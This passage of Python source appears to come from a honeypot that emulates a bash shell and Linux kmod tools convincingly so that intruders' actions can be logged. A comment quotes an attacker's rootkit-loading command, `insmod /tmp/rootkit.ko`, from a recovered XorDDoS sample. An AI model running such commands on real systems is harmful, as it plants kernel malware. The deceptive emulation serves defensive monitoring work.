            # It was not implemented at all, so find rejected the whole
            # expression with "unknown predicate" while -inum, which
            # answers the same question the long way round, worked.
            if fsnode is None:
                return False
            ref = self.fs.nodes.get(VFS.norm(arg, self.cwd))
            if ref is None:
                rp = self.fs.resolve(VFS.norm(arg, self.cwd))
                ref = self.fs.nodes.get(rp) if rp else None
            return (ref is not None
                    and self.fs.ino_of(ref) == self.fs.ino_of(fsnode))
        if name == "-inum":
            return bool(fsnode) and str(self.fs.ino_of(fsnode)) == arg
        if name == "-print":
            ctx["out"].append(shown + "\n")
            return True
        if name == "-print0":
            ctx["out"].append(shown + "\0")
            return True
        if name == "-printf":
            text = arg
            # %i and %n were missing, so `find -printf "%i"` printed the
            # two characters back at the caller while `stat -c %i` answered
            # -- one of the two ways to ask a filesystem for an inode did
            # not know the question. Same for the %T/%A/%C date fields.
            mt = fsnode.mtime if fsnode else 0
            repl = {"%f": base, "%p": shown, "%h": os.path.dirname(shown),
                    "%s": str(self._node_size(fsnode) if fsnode else 0),
                    "%m": "%o" % ((fsnode.mode & 0o7777) if fsnode else 0),
                    "%u": self._uname_of(fsnode.uid) if fsnode else "root",
                    "%g": self._gname_of(fsnode.gid) if fsnode else "root",
                    "%y": ("d" if fsnode and fsnode.is_dir else "f"),
                    # find spells the *name* %u and the number %U, which
                    # is the opposite way round from stat; %U and %G were
                    # missing entirely.
                    "%U": str(fsnode.uid if fsnode else 0),
                    "%G": str(fsnode.gid if fsnode else 0),
                    "%i": str(self.fs.ino_of(fsnode)),
                    "%n": str(self.fs.nlink(path)),
                    "%d": str(shown.rstrip("/").count("/")),
                    "%T@": "%.10f" % mt}
            for letter, clock in (("T", mt),
                                  ("A", (fsnode.atime if fsnode else 0)),
                                  ("C", (fsnode.ctime if fsnode else 0))):
                tm = time.localtime(clock)
                for spec, fmt in (("Y", "%Y"), ("m", "%m"), ("d", "%d"),
                                  ("H", "%H"), ("M", "%M"), ("S", "%S"),
                                  ("F", "%Y-%m-%d"), ("T", "%H:%M:%S")):
                    repl["%%%s%s" % (letter, spec)] = time.strftime(fmt, tm)
            # Longest first, so %T@ is not eaten by %T followed by a stray @.
            for k in sorted(repl, key=len, reverse=True):
                text = text.replace(k, repl[k])
            ctx["out"].append(self._unescape_c(text))
            return True
        if name == "-ls":
            ctx["out"].append(self._ls_long([(path, fsnode, shown)], "l"))
            return True
        if name == "-delete":
            self.fs.remove(path, recursive=True)
            return True
        if name == "-quit":
            return True
        if name == "-prune":
            # True, and the walk must not enter this directory.
            if self.fs.isdir(path):
                ctx.setdefault("pruned", []).append(path)
            return True
        if name in ("-readable", "-writable", "-executable"):
            if fsnode is None:
                return False
            bit = {"-readable": 0o444, "-writable": 0o222,
                   "-executable": 0o111}[name]
            return bool(fsnode.mode & bit)
        if name in ("-nouser", "-nogroup", "-false"):
            return name == "-false" and False
        return True

    def cmd_test(self, a, stdin=""):
        a = list(a)
        if a and a[-1] == "]":
            a = a[:-1]
        neg = False
        while a and a[0] == "!":
            neg = not neg
            a = a[1:]

        def result(v):
            return ("", 1 if (v ^ neg) is False else 0) if False else ("", 0 if (v != neg) else 1)

        if not a:
            return result(False)
        if len(a) == 1:
            return result(bool(a[0]))
        if len(a) == 2:
            flag, arg = a
            if flag == "-z":
                return result(arg == "")
            if flag == "-n":
                return result(arg != "")
            path = VFS.norm(arg, self.cwd)
            # -L and -h ask whether the path *is* a symlink, so they look at
            # the link itself. Every other predicate follows it, which none
            # of them did: `[ -d link ]` was false for a link to a
            # directory, and `[ -f dangling ]` was true for a link to
            # nothing. `[ -d "$dir" ]` is in every script there is.
            lnode = self.fs.lnode(path)
            if flag in ("-L", "-h"):
                return result(lnode is not None and lnode.link is not None)
            node = self.fs.target_node(path)
            if flag in ("-e", "-a"):
                return result(node is not None)
            if flag == "-f":
                return result(node is not None and not node.is_dir
                              and node.chardev is None
                              and node.blockdev is None)
            if flag == "-d":
                return result(node is not None and node.is_dir)
            if flag == "-s":
                return result(node is not None
                              and self._node_size(node) > 0)
            if flag == "-r":
                return result(node is not None)
            if flag == "-w":
                return result(node is not None and bool(node.mode & 0o200))
            if flag == "-x":
                return result(node is not None and bool(node.mode & 0o111))
            if flag == "-c":
                return result(node is not None and node.chardev is not None)
            if flag == "-b":
                # `test -b /dev/sda` returned false, so the check anyone
                # makes before touching a disk said it was not a disk.
                return result(node is not None and node.blockdev is not None)
            if flag == "-S":
                # A socket. `ls -l` printed s, `find -type s` found them and
                # `test -S` said no, so the check a client makes before
                # connecting to /run/mysqld/mysqld.sock disagreed with every
                # other view of the same file.
                return result(node is not None
                              and bool(getattr(node, "sock", False)))
            if flag == "-p":
                return result(node is not None
                              and getattr(node, "fifo", False))
            if flag == "-g":
                return result(node is not None and bool(node.mode & 0o2000))
            if flag == "-u":
                return result(node is not None and bool(node.mode & 0o4000))
            if flag == "-k":
                return result(node is not None and bool(node.mode & 0o1000))
            return result(False)
        if len(a) >= 3:
            l, op, r = a[0], a[1], a[2]
            if op in ("=", "=="):
                return result(l == r)
            if op == "!=":
                return result(l != r)
            if op in ("-nt", "-ot", "-ef"):
                # File comparison operators, previously absent: the operands
                # fell through to int() and came back False for every input,
                # so `[ new -nt old ]` was always false. Build scripts gate
                # rebuilds on exactly this.
                ln = self.fs.nodes.get(VFS.norm(l, self.cwd))
                rn = self.fs.nodes.get(VFS.norm(r, self.cwd))
                if op == "-ef":
                    return result(ln is not None and rn is not None
                                  and self.fs.ino_of(ln)
                                  == self.fs.ino_of(rn))
                if op == "-nt":
                    return result(ln is not None
                                  and (rn is None or ln.mtime > rn.mtime))
                return result(rn is not None
                              and (ln is None or ln.mtime < rn.mtime))
            try:
                li, ri = int(l or 0), int(r or 0)
            except ValueError:
                return result(False)
            return result({"-eq": li == ri, "-ne": li != ri, "-lt": li < ri,
                           "-le": li <= ri, "-gt": li > ri, "-ge": li >= ri}.get(op, False))
        return result(False)

    # "[" is a real command name in POSIX, dispatched via getattr on cmd_<name>,
    # so it needs an explicit alias.
    cmd_bracket_alias = None

    _SET_OPTIONS = (
        ("allexport", "off"), ("braceexpand", "on"), ("emacs", "off"),
        ("errexit", "off"), ("errtrace", "off"), ("functrace", "off"),
        ("hashall", "on"), ("histexpand", "off"), ("history", "off"),
        ("ignoreeof", "off"), ("interactive-comments", "on"), ("keyword", "off"),
        ("monitor", "off"), ("noclobber", "off"), ("noexec", "off"),
        ("noglob", "off"), ("nolog", "off"), ("notify", "off"),
        ("nounset", "off"), ("onecmd", "off"), ("physical", "off"),
        ("pipefail", "off"), ("posix", "off"), ("privileged", "off"),
        ("verbose", "off"), ("vi", "off"), ("xtrace", "off"))

    def cmd_set(self, a, stdin=""):
        if a and a[0] == "--":
            self.params = list(a[1:])
            return "", 0
        # `set -o name` / `+o name` and the short flags were parsed and
        # discarded, so the option state existed only as a static listing.
        i = 0
        touched = False
        while i < len(a):
            x = a[i]
            if x in ("-o", "+o") and i + 1 < len(a):
                if a[i + 1] in self.set_opts:
                    self.set_opts[a[i + 1]] = "on" if x == "-o" else "off"
                    touched = True
                i += 2
                continue
            if len(x) > 1 and x[0] in "-+" and not x.startswith("--"):
                short = {"e": "errexit", "u": "nounset", "x": "xtrace",
                         "f": "noglob", "n": "noexec", "v": "verbose",
                         "a": "allexport", "C": "noclobber", "m": "monitor",
                         "b": "notify", "h": "hashall", "P": "physical"}
                if all(c in short for c in x[1:]):
                    for c in x[1:]:
                        self.set_opts[short[c]] = "on" if x[0] == "-" else "off"
                    touched = True
            i += 1
        if touched:
            return "", 0
        if a and a[0] == "-o" and len(a) == 1:
            # `set -o` with no option name lists them all. It printed nothing,
            # and an empty option list is not something bash produces.
            # bash pads the name to 15 and separates with a tab, not spaces
            return "".join("%-15s\t%s\n" % (n, self.set_opts[n])
                           for n, _v in self._SET_OPTIONS), 0
        if a and a[0] in ("+o",) and len(a) == 1:
            return "".join("set %so %s\n"
                           % ("-" if self.set_opts[n] == "on" else "+", n)
                           for n, _v in self._SET_OPTIONS), 0
        if not a:
            # Bare `set` dumps every shell variable, sorted, one per line.
            out = []
            for k, v in sorted(self.vars.items()):
                if not re.fullmatch(r"[A-Za-z_][A-Za-z_0-9]*", k):
                    continue
                out.append("%s=%s\n" % (k, self._shquote(v)))
            for name in sorted(self.funcs):
                out.append("%s () \n{ \n    %s\n}\n"
                           % (name, self.funcs[name].strip().replace("\n",
                                                                    "\n    ")))
            return "".join(out), 0
        return "", 0

    @staticmethod
    def _shquote(v):
        """How bash quotes a value in `set` / `declare -p` output."""
        if v == "":
            return "\"\""
        if re.fullmatch(r"[A-Za-z0-9_./:@%^+=-]+", v):
            return v
        if any(c in v for c in "\n\t"):
            return "$'" + v.replace("\\", "\\\\").replace("\n", "\\n").replace(
                "\t", "\\t") + "'"
        return '"' + v.replace('"', '\\"') + '"'

    def cmd_help(self, a, stdin=""):
        """bash's own help builtin. `help` was command-not-found, which no bash
        has ever been."""
        topics = {
            "cd": ("cd: cd [-L|[-P [-e]] [-@]] [dir]",
                   "    Change the shell working directory."),
            "pwd": ("pwd: pwd [-LP]",
                    "    Print the name of the current working directory."),
            "echo": ("echo: echo [-neE] [arg ...]",
                     "    Write arguments to the standard output."),
            "export": ("export: export [-fn] [name[=value] ...] or export -p",
                       "    Set export attribute for shell variables."),
            "set": ("set: set [-abefhkmnptuvxBCEHPT] [-o option-name] "
                    "[--] [-] [arg ...]",
                    "    Set or unset values of shell options and positional "
                    "parameters."),
            "read": ("read: read [-ers] [-a array] [-d delim] [-i text] "
                     "[-n nchars] [-N nchars] [-p prompt] [-t timeout] "
                     "[-u fd] [name ...]",
                     "    Read a line from the standard input and split it "
                     "into fields."),
            "kill": ("kill: kill [-s sigspec | -n signum | -sigspec] pid | "
                     "jobspec ... or kill -l [sigspec]",
                     "    Send a signal to a job."),
            "test": ("test: test [expr]",
                     "    Evaluate conditional expression."),
            "source": ("source: source filename [arguments]",
                       "    Execute commands from a file in the current "
                       "shell."),
            "help": ("help: help [-dms] [pattern ...]",
                     "    Display information about builtin commands."),
        }
        if not a:
            out = ["GNU bash, version %s (x86_64-pc-linux-gnu)\n"
                   % self.vars.get("BASH_VERSION", "5.2.37(1)-release"),
                   "These shell commands are defined internally.  "
                   "Type `help' to see this list.\n\n"]
            names = sorted(set(list(topics) + ["alias", "bg", "break", "cd",
                                               "continue", "declare", "eval",
                                               "exec", "exit", "fg", "for",
                                               "function", "getopts", "hash",
                                               "history", "if", "jobs", "let",
                                               "local", "printf", "return",
                                               "shift", "shopt", "trap",
                                               "type", "ulimit", "umask",
                                               "unalias", "unset", "wait",
                                               "while"]))
            for i in range(0, len(names), 2):
                pair = names[i:i + 2]
                out.append(" %-36s%s\n" % (pair[0], pair[1] if len(pair) > 1
                                            else ""))
            return "".join(out), 0
        out, rc = [], 0
        for topic in a:
            if topic.startswith("-"):
                continue
            if topic in topics:
                usage, desc = topics[topic]
                out.append("%s\n%s\n" % (usage, desc))
            else:
                self.err("bash: help: no help topics match `%s'.  Try `help "
                         "help' or `man -k %s' or `info %s'." % (topic, topic,
                                                                 topic))
                rc = 1
        return "".join(out), rc

    def cmd_shift(self, a, stdin=""):
        n = int(a[0]) if a and a[0].isdigit() else 1
        self.params = self.params[n:]
        return "", 0

    def _ifs_join(self, parts):
        """How "$*" and "${a[*]}" flatten: one word, joined by the first
        character of IFS. Both were being treated exactly like "$@" and
        expanded to one word per element, so `printf '%s\n' "$*"` printed
        a line per parameter where bash prints one, and `IFS=-; echo "$*"`
        printed "a b" instead of "a-b"."""
        ifs = self.vars.get("IFS")
        sep = " " if ifs is None else (ifs[:1])
        return sep.join(parts)

    @staticmethod
    def _unquoted_expansion(word):
        """True if `word` has an expansion that sits outside any quoting.

        Field splitting applies to that case and not to `"$v"` or `"$(cmd)"`.
        The test used to be whether the word contained a quote character
        anywhere, which is a different question: the quotes in
        `$(ls | grep "x")` belong to the inner command, not to the outer
        word. So the most common idiom in shell --
        `for f in $(cmd | grep "pat")` -- ran exactly once with the whole
        multi-line result as a single item, and `set -- $(echo "one two")`
        set $# to 1 where bash sets 2. Verified against bash both ways.

        The body of a substitution is skipped rather than scanned, so quotes
        and parentheses inside it cannot disturb the outer quote state.
        """
        i, n, q = 0, len(word), None

        def skip(j):
            """Past the expansion starting at word[j], whatever kind it is."""
            if word.startswith("$(", j):
                depth, k = 0, j + 1
                while k < n:
                    if word[k] == "(":
                        depth += 1
                    elif word[k] == ")":
                        depth -= 1
                        if depth == 0:
                            return k + 1
                    k += 1
                return n
            if word.startswith("${", j):
                depth, k = 0, j + 1
                while k < n:
                    if word[k] == "{":
                        depth += 1
                    elif word[k] == "}":
                        depth -= 1
                        if depth == 0:
                            return k + 1
                    k += 1
                return n
            if word[j] == "`":
                k = word.find("`", j + 1)
                return n if k < 0 else k + 1
            return j + 1

        while i < n:
            c = word[i]
            if q == "'":
                q = None if c == "'" else q
                i += 1
                continue
            if c == "\\":
                i += 2
                continue
            if q == '"':
                if c == '"':
                    q = None
                    i += 1
                elif c in "$`":
                    i = skip(i)
                else:
                    i += 1
                continue
            if c in "'\"":
                q = c
                i += 1
                continue
            if c == "$" and i + 1 < n and word[i + 1] in "'\"":
                # $'...' is ANSI-C quoting and $"..." is locale translation.
                # Both are *quotes* that happen to start with a dollar, not
                # expansions: the result is one word. Reading the dollar as
                # an expansion made `printf '%s\n' $'a\tb'` split on the tab
                # it had just produced and print two lines where bash prints
                # one -- shelltest caught it.
                q = word[i + 1]
                i += 2
                continue
            if c in "$`":
                return True
            i += 1
        return False

    def _ifs_split(self, text):
        """Field-split an unquoted expansion. Whitespace splitting was
        hardcoded, so `IFS=:` -- the reason a script sets IFS at all --
        changed nothing outside of read."""
        return [f for f in self._ifs_fields(text, 0) if f != ""]

    def _ifs_fields(self, line, maxfields):
        """Split a line the way read does, honouring IFS.

        Splitting was always on whitespace, so `IFS=: read -r u p uid` over
        /etc/passwd put the entire line in the first variable. Runs of IFS
        whitespace are one delimiter; each non-whitespace IFS character is a
        delimiter in its own right and keeps empty fields, which is the whole
        reason scripts set IFS=: to parse passwd.
        """
        ifs = self.vars.get("IFS")
        if ifs is None:
            ifs = " \t\n"
        if ifs == "":
            return [line]
        ws = [c for c in ifs if c in " \t\n"]
        nws = [c for c in ifs if c not in " \t\n"]
        if ws:
            line = line.strip("".join(ws))
        fields, cur, i = [], "", 0
        while i < len(line):
            if maxfields and len(fields) == maxfields - 1:
                cur = line[i:]
                if ws:
                    cur = cur.rstrip("".join(ws))
                i = len(line)
                break
            c = line[i]
            if c in nws:
                fields.append(cur)
                cur = ""
                i += 1
                while i < len(line) and line[i] in ws:
                    i += 1
                continue
            if c in ws:
                while i < len(line) and line[i] in ws:
                    i += 1
                if i < len(line) and line[i] in nws:
                    i += 1
                    while i < len(line) and line[i] in ws:
                        i += 1
                fields.append(cur)
                cur = ""
                continue
            cur += c
            i += 1
        fields.append(cur)
        return fields

    # read's flags that take a value. They were not consumed, so the value
    # was left in the operand list and read as a *variable name*:
    # `read -d : v` assigned the line to a variable literally called ":"
    # and left $v empty, and `read -p "Enter: " v` assigned it to "Enter:".
    # Both reported success. A script that prompts or uses a delimiter got
    # an empty variable out of a read that said it worked.
    _READ_VALUE_OPTS = ("-d", "-n", "-N", "-p", "-t", "-u", "-i")

    def cmd_read(self, a, stdin=""):
        flags, delim, nchars, exact = set(), "\n", None, False
        names, i = [], 0
        while i < len(a):
            x = a[i]
            if x in self._READ_VALUE_OPTS:
                val = a[i + 1] if i + 1 < len(a) else ""
                if x == "-d":
                    delim = val or "\0"
                elif x in ("-n", "-N"):
                    try:
                        nchars = int(val)
                    except ValueError:
                        nchars = None
                    exact = (x == "-N")
                i += 2
                continue
            if x.startswith("-") and len(x) > 1 and not x.startswith("--"):
                # Bundled or glued: -r, -rs, -n2.
                body = x[1:]
                m = re.match(r"^([nN])(\d+)$", body)
                if m:
                    nchars, exact = int(m.group(2)), m.group(1) == "N"
                    i += 1
                    continue
                flags.update(body)
                i += 1
                continue
            names.append(x)
            i += 1
        names = names or ["REPLY"]

        if nchars is not None:
            # -n stops after N characters rather than at the delimiter.
            chunk, rest = stdin[:nchars], stdin[nchars:]
            got = bool(chunk)
        elif delim == "\n":
            chunk, sep, rest = stdin.partition("\n")
            got = bool(chunk or sep)
        else:
            chunk, sep, rest = stdin.partition(delim)
            got = bool(chunk or sep)

        if "r" not in flags and nchars is None:
            # Without -r a backslash quotes the next character and a
            # backslash-newline is a line continuation. It was passed
            # through verbatim, so `read v` and `read -r v` gave the same
            # answer -- the one thing -r changes.
            while chunk.endswith("\\") and rest:
                nxt, _s, rest = rest.partition("\n")
                chunk = chunk[:-1] + nxt
            out, j = [], 0
            while j < len(chunk):
                if chunk[j] == "\\" and j + 1 < len(chunk):
                    out.append(chunk[j + 1]); j += 2; continue
                out.append(chunk[j]); j += 1
            chunk = "".join(out)

        if "a" in flags:
            # -a fills an array with every field, not a scalar with the
            # first one.
            self.arrays[names[0]] = self._ifs_fields(chunk, 0) or []
            self.vars.pop(names[0], None)
        else:
            parts = self._ifs_fields(chunk, len(names))
            for idx, nm in enumerate(names):
                self.vars[nm] = parts[idx] if idx < len(parts) else ""
        self._pending_stdin = rest
        return "", 0 if got else 1

    def cmd_mount(self, a, stdin=""):
        d = self.fs.read("/proc/mounts") or b""
        out = []
        for line in d.decode("latin-1").splitlines():
            f = line.split()
            if len(f) >= 4:
                out.append("%s on %s type %s (%s)\n" % (f[0], f[1], f[2], f[3]))
        return "".join(out), 0

    def cmd_lsmod(self, a, stdin=""):
        # Columns were %-22s %6s, so every line was three characters wider
        # than real lsmod's %-19s %8s, and the "Used by" column printed the
        # refcount alone -- kmod prints the refcount *and* the holder names,
        # which is the only place `lsmod` shows the dependency graph.
        d = (self.fs.read("/proc/modules") or b"").decode("latin-1")
        out = ["Module                  Size  Used by\n"]
        for line in d.splitlines():
            f = line.split()
            if len(f) >= 4:
                used = f[2] if f[3] == "-" else "%s %s" % (f[2], f[3].rstrip(","))
                out.append("%-19s %8s  %s\n" % (f[0], f[1], used))
        return "".join(out), 0

    # -- kmod ---------------------------------------------------------------
    #
    # modinfo, modprobe, insmod, rmmod and depmod were all unimplemented, so
    # each one fell through to the stock-binary stub and answered "missing
    # operand" no matter what you passed it. `insmod /tmp/rootkit.ko` -- the
    # last step of the XorDDoS sample recovered from this box -- got
    # "insmod: missing operand", which no real insmod has ever said.

    def _mod_by_name(self, name):
        base = name.rsplit("/", 1)[-1]
        for suf in (".ko.xz", ".ko.zst", ".ko"):
            if base.endswith(suf):
                base = base[:-len(suf)]
                break
        base = base.replace("-", "_")
        for m in LOADED_MODULES:
            if m[0] == base:
                return m
        return None

    def _mod_loaded(self, name):
        m = self._mod_by_name(name)
        return m is not None and m[0] not in self.fs.removed_modules

    def _mod_builtin(self, name):
        base = name.rsplit("/", 1)[-1].split(".")[0].replace("-", "_")
        return any(n == base for n, _sub in BUILTIN_MODULES)

    def _sysfs_module(self, name, present):
        """Add or drop /sys/module/<name>, matching /proc/modules."""
        base = "/sys/module/" + name
        if not present:
            for k in [k for k in self.fs.nodes
                      if k == base or k.startswith(base + "/")]:
                del self.fs.nodes[k]
            # A holder link naming a module that is gone is a dangling
            # symlink no real sysfs would keep.
            for m in LOADED_MODULES:
                link = "/sys/module/%s/holders/%s" % (m[0], name)
                self.fs.nodes.pop(link, None)
            return
        for m in LOADED_MODULES:
            if m[0] != name:
                continue
            _n, sz, rc, holders, _dep, _sub, _desc = m
            def d(pth):
                self.fs.nodes[pth] = FileNode(mode=0o755, is_dir=True,
                                              mtime=int(time.time()))
            def w(pth, body, mode=0o444):
                self.fs.nodes[pth] = FileNode(mode=mode,
                                              content=body.encode(),
                                              mtime=int(time.time()))
            for sub in ("", "/sections", "/notes", "/holders", "/parameters"):
                d(base + sub)
            w(base + "/coresize", "%d\n" % sz)
            w(base + "/initstate", "live\n")
            w(base + "/refcnt", "%d\n" % rc)
            w(base + "/taint", "\n")
            w(base + "/srcversion", _mod_srcversion(_n) + "\n")
            w(base + "/uevent", "", mode=0o200)
            for h in holders:
                if h not in self.fs.removed_modules:
                    self.fs.symlink(base + "/holders/" + h, "../../" + h)
            for other in LOADED_MODULES:
                if name in other[3] and other[0] not in self.fs.removed_modules:
                    self.fs.symlink(
                        "/sys/module/%s/holders/%s" % (other[0], name),
                        "../../" + name)

    def _kmsg(self, text, facility="kern", level="info"):
        """Append a kernel message, as the real kernel would. A record, not
        a formatted line: dmesg has five ways of printing one, and
        journalctl -k and kern.log each have their own.

        It also goes to the two files rsyslog is configured here to copy
        the kernel into. `rmmod evdev` used to leave a line in dmesg that
        /var/log/kern.log never heard about, which is one command's
        distance from catching the box out.
        """
        up = time.time() - BOOT_TS
        self.fs.dmesg_extra.append((up, facility, level, text))
        self.fs.dmesg_extra[:] = self.fs.dmesg_extra[-64:]
        line = ("%s %s kernel: %s\n"
                % (time.strftime("%b %e %H:%M:%S"), HOST, text))
        for path in ("/var/log/kern.log", "/var/log/syslog"):
            try:
                node = self.rawfs.nodes.get(path)
                if node is None or node.is_dir:
                    continue
                node.content = ((self.rawfs.read(path) or b"")
                                + line.encode("latin-1", "replace"))
                node.blob = None
                node.mtime = time.time()
                node.ctime = max(node.ctime, node.mtime)
            except Exception:                                 # noqa: BLE001
                pass

    _VERMAGIC = "SMP preempt mod_unload modversions "

    def _kmod_version(self, tool):
        return ("kmod version %s\n"
                "+ZSTD +XZ +ZLIB +LIBCRYPTO -EXPERIMENTAL\n"
                % self._upstream("kmod").split("-")[0]), 0

    def cmd_modinfo(self, a, stdin=""):
        field, want, names = None, [], []
        i = 0
        while i < len(a):
            x = a[i]
            if x in ("-V", "--version"):
                return self._kmod_version("modinfo")
            if x in ("-F", "--field"):
                field = a[i + 1] if i + 1 < len(a) else ""
                i += 2
                continue
            if x in ("-n", "--filename"):
                want.append("filename")
            elif x in ("-d", "--description"):
                want.append("description")
            elif x in ("-l", "--license"):
                want.append("license")
            elif x in ("-a", "--author"):
                want.append("author")
            elif x in ("-p", "--parameters"):
                want.append("parm")
            elif x in ("-0", "--null", "-k", "-b", "-s"):
                pass
            elif x.startswith("-"):
                pass
            else:
                names.append(x)
            i += 1
        if not names:
            self.err("modinfo: ERROR: missing module or filename.")
            return "", 1
        out, rc = [], 0
        for nm in names:
            if "/" in nm and self.fs.read(VFS.norm(nm, self.cwd)) is None:
                self.err("modinfo: ERROR: Module %s not found." % nm)
                rc = 1
                continue
            m = self._mod_by_name(nm)
            if m is None:
                if self._mod_builtin(nm):
                    base = nm.rsplit("/", 1)[-1].split(".")[0]
                    fields = [("name", base), ("filename", "(builtin)")]
                else:
                    self.err("modinfo: ERROR: Module %s not found." % nm)
                    rc = 1
                    continue
            else:
                name, sz, _rc, _h, deps, sub, desc = m
                fields = [
                    ("filename", "/lib/modules/%s/kernel/%s/%s.ko.xz"
                     % (KERNEL, sub, name)),
                    ("license", "GPL"),
                ]
                if desc:
                    fields.append(("description", desc))
                fields += [
                    ("srcversion", _mod_srcversion(name)),
                    ("depends", ",".join(deps)),
                    ("retpoline", "Y"),
                    ("intree", "Y"),
                    ("name", name),
                    ("vermagic", KERNEL + " " + self._VERMAGIC),
                ]
            d = dict(fields)
            if field is not None:
                v = d.get(field)
                if v:
                    out.append(v + "\n")
                continue
            if want:
                for w in want:
                    v = d.get(w)
                    if v:
                        out.append(v + "\n")
                continue
            for k, v in fields:
                out.append("%-15s %s\n" % (k + ":", v))
        return "".join(out), rc

    def cmd_insmod(self, a, stdin=""):
        args = [x for x in a if not x.startswith("-")]
        if any(x in ("-V", "--version") for x in a):
            return self._kmod_version("insmod")
        if not args:
            self.err("insmod: ERROR: missing filename.")
            return "", 1
        path = VFS.norm(args[0], self.cwd)
        node = self.fs.nodes.get(path)
        if node is None or node.is_dir:
            self.err("insmod: ERROR: could not load module %s: "
                     "No such file or directory" % args[0])
            self.log(event="insmod_attempt", path=args[0], result="missing")
            return "", 1
        if self.user != "root":
            self.err("insmod: ERROR: could not insert module %s: "
                     "Operation not permitted" % args[0])
            self.log(event="insmod_attempt", path=args[0], result="eperm")
            return "", 1
        # A module built anywhere else has the wrong vermagic, and this is
        # exactly what the kernel says about it -- including the dmesg line,
        # which is where anyone debugging a failed rootkit load looks next.
        base = args[0].rsplit("/", 1)[-1].split(".")[0]
        self._kmsg("module: %s: version magic 'unknown' should be '%s %s'"
                   % (base, KERNEL, self._VERMAGIC.strip()))
        self.err("insmod: ERROR: could not insert module %s: "
                 "Invalid module format" % args[0])
        self.log(event="insmod_attempt", path=args[0], result="invalid_format",
                 size=(len(node.content) if node.content else 0), gap=False,
                 notable=True)
        return "", 1

    def cmd_rmmod(self, a, stdin=""):
        names = [x for x in a if not x.startswith("-")]
        if any(x in ("-V", "--version") for x in a):
            return self._kmod_version("rmmod")
        force = any(x in ("-f", "--force") for x in a)
        if not names:
            self.err("rmmod: ERROR: missing module name.")
            return "", 1
        rc = 0
        for nm in names:
            m = self._mod_by_name(nm)
            if m is None or m[0] in self.fs.removed_modules:
                self.err("rmmod: ERROR: Module %s is not currently loaded"
                         % nm.rsplit("/", 1)[-1].split(".")[0])
                rc = 1
                continue
            if self.user != "root":
                self.err("rmmod: ERROR: could not remove module %s: "
                         "Operation not permitted" % m[0])
                rc = 1
                continue
            live = [h for h in m[3] if h not in self.fs.removed_modules]
            eff = m[2] - (len(m[3]) - len(live))
            if eff > 0 and not force:
                if live:
                    self.err("rmmod: ERROR: Module %s is in use by: %s"
                             % (m[0], " ".join(live)))
                else:
                    self.err("rmmod: ERROR: Module %s is in use." % m[0])
                rc = 1
                continue
            self.fs.removed_modules.add(m[0])
            # /sys/module/<name> goes away with the module. Leaving the
            # directory behind meant lsmod and /sys/module disagreed about
            # what was loaded again, one command after rmmod fixed it.
            self._sysfs_module(m[0], present=False)
            self._kmsg("%s: module unloaded" % m[0])
            self.log(event="module_removed", module=m[0], notable=True)
        return "", rc

    def cmd_modprobe(self, a, stdin=""):
        remove = dry = False
        names = []
        i = 0
        while i < len(a):
            x = a[i]
            if x in ("-V", "--version"):
                return self._kmod_version("modprobe")
            if x in ("-r", "--remove"):
                remove = True
            elif x in ("-n", "--dry-run", "--show"):
                dry = True
            elif x in ("-C", "--config", "-d", "--dirname", "-S", "--set-version"):
                i += 2
                continue
            elif x.startswith("-"):
                pass
            elif "=" not in x:
                names.append(x)
            i += 1
        if not names:
            self.err("modprobe: ERROR: missing parameters. See -h.")
            return "", 1
        rc = 0
        for nm in names:
            m = self._mod_by_name(nm)
            if remove:
                if m is None or m[0] in self.fs.removed_modules:
                    self.err("modprobe: FATAL: Module %s is not currently "
                             "loaded" % nm)
                    rc = 1
                    continue
                if dry:
                    continue
                sub = self.cmd_rmmod([m[0]])
                if sub[1]:
                    rc = 1
                continue
            if m is None and not self._mod_builtin(nm):
                self.err("modprobe: FATAL: Module %s not found in directory "
                         "/lib/modules/%s" % (nm, KERNEL))
                self.log(event="modprobe_missing", module=nm)
                rc = 1
                continue
            if self.user != "root":
                self.err("modprobe: ERROR: could not insert '%s': "
                         "Operation not permitted" % nm)
                rc = 1
                continue
            if m is not None and m[0] in self.fs.removed_modules:
                self.fs.removed_modules.discard(m[0])
                self._sysfs_module(m[0], present=True)
                self._kmsg("%s: module loaded" % m[0])
        return "", rc

    def cmd_depmod(self, a, stdin=""):
        if any(x in ("-V", "--version") for x in a):
            return self._kmod_version("depmod")
        if self.user != "root":
            self.err("depmod: ERROR: openat(/lib/modules/%s, modules.dep.bin) "
                     "failed: Permission denied" % KERNEL)
            return "", 1
        return "", 0

    def cmd_stat(self, a, stdin=""):
        fmt = None
        files, terse, deref, fsmode = [], False, False, False
        i = 0
        while i < len(a):
            x = a[i]
            if x in ("-c", "--format", "--printf"):
                fmt = a[i + 1] if i + 1 < len(a) else ""
                i += 2
                continue
            if x.startswith("-c") and len(x) > 2:
                fmt = x[2:]
            elif (len(x) > 2 and x[0] == "-" and x[1] != "-"
                  and "c" in x[1:] and x.rstrip().endswith("c")):
                # A bundle ending in -c takes the next word as the format:
                # `stat -Lc %F` was read as one unknown option, so -c was
                # lost and stat printed its whole block instead of one field.
                for ch in x[1:-1]:
                    if ch == "L":
                        deref = True
                    elif ch == "f":
                        fsmode = True
                    elif ch == "t":
                        terse = True
                fmt = a[i + 1] if i + 1 < len(a) else ""
                i += 2
                continue
            elif x.startswith("--format=") or x.startswith("--printf="):
                fmt = x.split("=", 1)[1]
            elif x in ("-t", "--terse"):
                terse = True
            elif x in ("-L", "--dereference"):
                deref = True
            elif x in ("-f", "--file-system"):
                fsmode = True
            elif not x.startswith("-"):
                files.append(x)
            i += 1
        out, rc = [], 0
        for f in files:
            path = VFS.norm(f, self.cwd)
            node = (self.fs.nodes.get(path)
                    or self.fs.nodes.get(self.fs.resolve(path)))
            if node is not None and node.link is not None and deref:
                path = self.fs.resolve(path)
                # -L asks for the target, and a loop has none. Without this
                # stat -L reported the link it stopped on as a "symbolic
                # link" and exited 0 -- so -L and no -L gave the same
                # answer, which is the one thing -L exists to change.
                if getattr(self.fs, "_resolve_loop", False):
                    self.err("stat: cannot statx '%s': Too many levels of "
                             "symbolic links" % f)
                    rc = 1
                    continue
                node = (self.fs.nodes.get(path)
                    or self.fs.nodes.get(self.fs.resolve(path)))
            if node is None:
                path2 = self.fs.resolve(path)
                node = self.fs.nodes.get(path2)
                if node is not None:
                    path = path2
            if node is None:
                self.err("stat: cannot statx '%s': No such file or directory" % f)
                rc = 1
                continue
            if fsmode:
                # `stat -f -c %b` ignored its format and printed the whole
                # block, so a script asking for one filesystem number got
                # five lines of prose. The numbers come from the same place
                # the unformatted block does -- they were a second hardcoded
                # copy, always the root filesystem, so `stat -f -c %T /tmp`
